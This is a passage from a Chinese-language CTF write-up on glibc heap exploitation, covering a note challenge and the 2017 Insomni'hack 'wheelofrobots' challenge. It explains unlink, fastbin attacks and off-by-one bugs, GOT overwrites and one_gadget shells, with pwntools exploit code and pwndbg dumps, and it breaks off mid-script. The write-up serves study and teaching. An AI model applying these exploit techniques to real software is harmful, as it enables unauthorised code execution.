    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;(less than 128)&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;content:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">shownote</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;note:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">editnote</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">choice</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;note:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2.append]&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">choice</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">deletenote</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;note:&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">id</span><span class="p">))</span>
</code></pre></div>
<h4 id="note">生成三个 note<a class="headerlink" href="#note" title="Permanent link">&para;</a></h4>
<p>构造三个 chunk，chunk0、chunk1 和 chunk2</p>
<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk_ptr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk_ptr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>

<span class="n">newnote</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">newnote</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
<span class="n">newnote</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</code></pre></div>
<p>其中这三个 chunk 申请时的大小分别为 0x80，0，0x80 。chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。</p>
<p>这里需要注意的是，chunk0 中一共构造了两个 chunk</p>
<ul>
<li>chunk ptr[0]，这个是为了 unlink 时修改对应的值。</li>
<li>chunk ptr[0]'s nextchunk，这个是为了使得 unlink 时的第一个检查满足。</li>
</ul>
<div class="highlight"><pre><span></span><code>    <span class="c1">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize</span><span class="p">(</span><span class="n">P</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      \
      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;corrupted size vs. prev_size&quot;</span><span class="p">);</span>               \
</code></pre></div>
<p>当构造完三个 note 后，堆的基本构造如图 1 所示。</p>
<div class="highlight"><pre><span></span><code>                                   +-----------------+ high addr
                                   |      ...        |
                                   +-----------------+
                                   |      &#39;b&#39;*8      |
                ptr[2]-----------&gt; +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|------------
                                   |    unused       |
                                   +-----------------+
                                   |    &#39;a&#39;*8        |
                 ptr[1]----------&gt; +-----------------+  chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |    unused       |
                                   +-----------------+
                                   |   ……………………      |
fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
                                   |   ……………………      |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0xa1         |  chunk 0
                                   +-----------------+
                                   |    0            |
                 ptr[0]----------&gt; +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
</code></pre></div>
<div class="highlight"><pre><span></span><code>pwndbg&gt; x /40gx 0x603000
0x603000:   0x0000000000000000  0x0000000000000091
0x603010:   0x0000000000000000  0x00000000000000a1
0x603020:   0x0000000000602108  0x0000000000602110
0x603030:   0x0000000000000000  0x0000000000000000
0x603040:   0x0000000000000000  0x0000000000000000
0x603050:   0x0000000000000000  0x0000000000000000
0x603060:   0x0000000000000000  0x0000000000000000
0x603070:   0x0000000000000000  0x0000000000000000
0x603080:   0x0000000000000000  0x0000000000000000
0x603090:   0x0000000000000000  0x0000000000000021
0x6030a0:   0x6262626262626262  0x0000000000000000
0x6030b0:   0x0000000000000000  0x0000000000000091
0x6030c0:   0x6363636363636363  0x0000000000000000
0x6030d0:   0x0000000000000000  0x0000000000000000
</code></pre></div>
<h4 id="chunk1-chunk2-chunk2">释放 chunk1 - 覆盖 chunk2 - 释放 chunk2<a class="headerlink" href="#chunk1-chunk2-chunk2" title="Permanent link">&para;</a></h4>
<p>对应的代码如下</p>
<div class="highlight"><pre><span></span><code><span class="n">deletenote</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span>
<span class="n">newnote</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">deletenote</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
<span class="n">editnote</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">shownote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>
<p>首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。</p>
<div class="highlight"><pre><span></span><code>                                   +-----------------+high addr
                                   |      ...        |
                                   +-----------------+
                                   |   &#39;\x00&#39;+&#39;b&#39;*7  |
                ptr[2]-----------&gt; +-----------------+ chunk 2
                                   |    size=0x90    |
                                   +-----------------+
                                   |    0xa0         |
                                   +-----------------|------------
                                   |    &#39;a&#39;*8        |
                                   +-----------------+
                                   |    &#39;a&#39;*8        |
                 ptr[1]----------&gt; +-----------------+ chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |   ...           |
                                   +-----------------+
                                   |  ...            |
fake ptr[0] chunk&#39;s nextchunk-----&gt;+-----------------+
                                   |    ...          |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0xa1         |  chunk 0
                                   +-----------------+
                                   |    &#39;0&#39; *8       |
                 ptr[0]----------&gt; +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           图2
</code></pre></div>
<div class="highlight"><pre><span></span><code>pwndbg&gt; x /40gx 0x603000
0x603000:   0x0000000000000000  0x0000000000000091
0x603010:   0x0000000000000000  0x00000000000000a1
0x603020:   0x0000000000602108  0x0000000000602110
0x603030:   0x0000000000000000  0x0000000000000000
0x603040:   0x0000000000000000  0x0000000000000000
0x603050:   0x0000000000000000  0x0000000000000000
0x603060:   0x0000000000000000  0x0000000000000000
0x603070:   0x0000000000000000  0x0000000000000000
0x603080:   0x0000000000000000  0x0000000000000000
0x603090:   0x0000000000000000  0x0000000000000021
0x6030a0:   0x6161616161616161  0x6161616161616161
0x6030b0:   0x00000000000000a0  0x0000000000000090
0x6030c0:   0x6363636363636300  0x0000000000000000
</code></pre></div>
<p>该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束</p>
<div class="highlight"><pre><span></span><code>    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">P</span> <span class="o">||</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>                      \
</code></pre></div>
<p>unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。</p>
<h4 id="libc">泄露 libc 地址<a class="headerlink" href="#libc" title="Permanent link">&para;</a></h4>
<p>代码如下</p>
<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
<span class="n">editnote</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
<span class="n">shownote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content is &quot;</span><span class="p">)</span>
<span class="n">leak_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xf1207</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;leak_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;system_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;onegadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">))</span>
</code></pre></div>
<p>我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。</p>
<h4 id="atoi-got">修改 atoi got<a class="headerlink" href="#atoi-got" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span>
<span class="n">editnote</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<p>由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 one_gadget 地址。</p>
<h4 id="get-shell">get shell<a class="headerlink" href="#get-shell" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;skye&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>此时如果我们再调用 atoi ，其实调用的就是 one_gadget ，所以就可以拿到 shell 了。</p>
<h3 id="_14">总结<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>题目考点：unlink、fastbin 机制、数字类型运算转换。</p>
<p>unlink 和 fastbin 与上面学习的差别不大，都是利用 unlink 控制 chunk list 修改当中的 堆指针地址，实现一个任意地址读写。</p>
<p>一开始在这条题目卡住就是在，edit 这个功能一度以为存在堆溢出。最后看 wp 才知道存在 unsigned int 与 int 运算类型转换的逻辑漏洞，找到溢出点就好做了。</p>
<h2 id="2017-insomnihack-wheelofrobots">2017 insomni'hack wheelofrobots<a class="headerlink" href="#2017-insomnihack-wheelofrobots" title="Permanent link">&para;</a></h2>
<h3 id="_15">基本信息<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre></div>
<p>动态链接 64 位，主要开启了 canary 保护与 nx 保护。</p>
<h3 id="_16">基本功能<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<p>大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子才能启动。</p>
<p>程序非常依赖的一个功能是读取整数，该函数 read_num 是读取最长为 4 字节的内容，然后将其转化为 int 类型返回。</p>
<p>程序基本功能：堆增删查改。</p>
<ul>
<li>add</li>
</ul>
<p>最多能申请 3 个堆块。每种轮子的创建策略不同，主要确保是申请大小的限制以及是否固定大小。</p>
<ul>
<li>start_robot</li>
</ul>
<p>随机选择一个轮子（堆）的内容进行输出，然后退出程序。</p>
<ul>
<li>change</li>
</ul>
<p>根据每个 chunk size 修改 chunk 内容</p>
<h3 id="_17">漏洞<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<h4 id="off-by-one">off-by-one<a class="headerlink" href="#off-by-one" title="Permanent link">&para;</a></h4>
<p>add 选择添加的轮子时，调用 read_num 最长可以写入 4 字节，最后 1 字节会覆盖 bender_inuse ，构成了 off-by-one 漏洞。</p>
<div class="highlight"><pre><span></span><code>.bss:0000000000603110 choice          db    ? ;               ; DATA XREF: add+3A↑o
.bss:0000000000603110                                         ; add+49↑o ...
.bss:0000000000603111                 db    ? ;
.bss:0000000000603112                 db    ? ;
.bss:0000000000603113                 db    ? ;
.bss:0000000000603114 bender_inuse    dd ?                    ; DATA XREF: add:loc_400EE0↑r
</code></pre></div>
<h4 id="_18">堆溢出<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
<p>add 添加 destructor 轮子（第6个）时，size 是正常产生的：<code>destructor = calloc(1uLL, 20 * v5);</code> ，没有对 v5 大小进行限制，具体可以对比第 3 个轮子。read_num 定义返回值为 int ，v5 定义为 unsigned int ，只要读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出。与此同时， <code>destructor_size = v5</code> 会很大，destructor_size 定义为 __int64 即 long long int 有符号 64 位整数，v5 强制赋值给它会依然为一个非常大的正数。</p>
<h4 id="uaf">UAF<a class="headerlink" href="#uaf" title="Permanent link">&para;</a></h4>
<p>free chunk 只是释放内存，没有将对应指针清空，size 位也没有清空。</p>
<h3 id="_19">利用思路<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
<blockquote>
<p>构造任意读写指针比较绕，后面就是前面的 unlink 操作。</p>
</blockquote>
<p>基本利用思路如下</p>
<ol>
<li>利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 <code>destructor_size</code>的大小，从而实现任意长度堆溢出。这里我们将轮子 1 tinny 分配到这里。</li>
</ol>
<blockquote>
<p>这里是一定要 destructor 这个轮子，控制其他轮子的 size 值也是可以的，但主要是否能 bypass fastbin 的检查就行。</p>
</blockquote>
<p>fastbin attack 将 1 tinny 指针指向 destructor_size ，后续通过 edit 1 tinny 修改 destructor_size 。</p>
<div class="highlight"><pre><span></span><code><span class="c1"># add a fastbin chunk 0x20 and free it</span>
<span class="c1"># fastbin 指针指向：2 bender-&gt;NULL</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># 2 bender</span>
<span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="c1"># off-by-one 覆写 idx2 inuse 为 1 让我们能编辑</span>
<span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1"># 覆写 fd 2 0x603138, point to 2 bender&#39;s size,后面伪造堆fd就是destructor_size</span>
<span class="c1"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span>
<span class="n">change</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603138</span><span class="p">))</span>
<span class="c1"># off-by-one 覆写 idx2 inuse 为 1</span>
<span class="c1"># 让我们再一次申请 2 bender</span>
<span class="n">overflow_benderinuse</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="c1"># add 2 bender again, fastbin 0x603138-&gt;NULL</span>
<span class="c1"># 将原来 2 bender 空间申请出来</span>
<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="c1"># in order to malloc chunk at 0x603138</span>
<span class="c1"># 绕过fastbin size 检查：将size位伪造一个fastbin范围的值</span>
<span class="c1"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span>
<span class="c1"># 0x603140 是 3 Devil 的size位，申请fastbin范围即可</span>
<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="c1"># trigger malloc, set tinny point to 0x603148</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1"># 释放无用堆</span>
<span class="c1"># wheels must &lt;= 3</span>
<span class="c1"># only save tinny(0x603138)</span>
<span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</code></pre></div>
<ol>
<li>分别分配合适大小的物理相邻的 chunk，其中包括 destructor。借助上面可以任意长度堆溢出的漏洞，对 destructor 对应的 chunk 进行溢出，将其溢出到下一个物理相邻的 chunk，从而实现对 0x6030E8 处 fake chunk 进行 unlink 的效果，这时 bss 段的 destructor 指向 0x6030D0。从而，我们可以再次实现覆盖 bss 段几乎所有的内容。</li>
</ol>
<p>unlink 将 6 destructor 的指针指向 0x06030E8 - 0x18</p>
<div class="highlight"><pre><span></span><code><span class="c1"># alloc 6 destructor size 60-&gt;0x50, chunk content 0x40</span>
<span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="c1"># alloc 3 devil, size=20*7=140, bigger than fastbin</span>
<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>
<span class="c1"># edit destructor&#39;s size to 1000 by tinny</span>
<span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>
<span class="c1"># place fake chunk at destructor&#39;s pointer</span>
<span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="mh">0x6030E8</span>
<span class="n">fakechunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span>
    <span class="n">fakechunk_addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">fakechunk</span> <span class="o">=</span> <span class="n">fakechunk</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="n">fakechunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">)</span>
<span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">fakechunk</span><span class="p">)</span>
<span class="c1"># trigger unlink</span>
<span class="n">remove</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</code></pre></div>
<ol>
<li>构造一个任意地址写的漏洞。通过上述的漏洞将已经分配的轮子 1 tinny 指针覆盖为 destructor 的地址，那么此后编辑 tinny 即在编辑 destructor 的内容，进而当我们再次编辑 destructor 时就相当于任意低地址写。</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="c1"># make 0x6030F8 point to 0x6030E8</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6030E8</span><span class="p">)</span>
<span class="n">change</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<ol>
<li>由于程序只是在最后启动机器人的时候，才会随机输出一些轮子的内容，并且一旦输出，程序就会退出，由于这部分我们并不能控制，所以我们将 <code>exit()</code> patch 为一个 <code>ret</code> 地址。这样的话，我们就可以多次输出内容了，从而可以泄漏一些 got 表地址。<strong>其实，既然我们有了任意地址写的漏洞，我们也可以将某个 got 写为 puts 的 plt 地址，进而调用相应函数时便可以直接将相应内容输出。但是这里并不去采用这种方法，因为之前已经在 hitcon stkof 中用过这种手法了。</strong></li>
</ol>
<blockquote>
<p>将 exit() got 表修改为 ret ，就通过多次调用总会输出被我们修改指针的轮子</p>
<p>hijack 某个函数 got 为 puts ，比如 free 那么实际上不是释放了是输出指针指向的内容</p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="c1"># make exit just as return</span>
<span class="n">write</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">],</span> <span class="mh">0x401954</span><span class="p">)</span>
</code></pre></div>
<ol>
<li>在泄漏了相应的内容后，我们便可以得到 libc 基地址，system 地址，libc 中的 /bin/sh 地址。进而我们修改 free@got 为 system 地址。从而当再次释放某块内存时，便可以启动 shell。</li>
</ol>
<h3 id="exp_1">EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./wheelofrobots&quot;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./wheelofrobots&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Your choice :&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Bender&#39;s intelligence: &quot;</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Robot Devil&#39;s cruelty: &quot;</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">elif</span> <span class="n">idx</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Increase Destructor&#39;s powerful: &quot;</span><span class="p">)</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>


